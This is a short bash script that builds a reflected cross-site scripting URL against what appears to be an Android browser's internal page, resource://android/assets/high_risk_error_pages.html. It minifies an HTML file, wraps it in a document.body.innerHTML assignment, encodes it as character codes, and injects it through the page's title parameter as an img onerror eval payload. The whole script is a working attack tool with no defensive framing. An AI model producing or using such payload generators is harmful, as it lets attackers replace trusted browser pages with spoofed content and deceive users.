# This script will take in an html file name as a command line arg, convert the file's contents into character codes using str2chr.sh, and put it inside of a URL to be used for reflected XSS.

# Get rid of tabs, underscores, and newlines, where tabs are two space characters. Also escape double quotes.
minified=$(
  cat $1 | sed -r 's/(  )//g' | tr '\n' '_' | sed 's/_//g'
)

# Get the directory of this script -- I got this from https://www.ostricher.com/2014/10/the-right-way-to-get-the-directory-of-a-bash-script/
DIR=$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )

XSS_PREFIX='document.body.innerHTML=`'
XSS_SUFFIX='`'
echo "$XSS_PREFIX$minified$XSS_SUFFIX"
# Convert to ascii
ascii=$(bash "$DIR/str2utf.sh" "$XSS_PREFIX$minified$XSS_SUFFIX")

# echo $ascii

URL_PREFIX="resource://android/assets/high_risk_error_pages.html?&title=%3Cimg%20src%3D%22%22%20onerror%3D%22eval(String.fromCharCode("
URL_SUFFIX="))%22%3E"

echo "$URL_PREFIX$ascii$URL_SUFFIX"
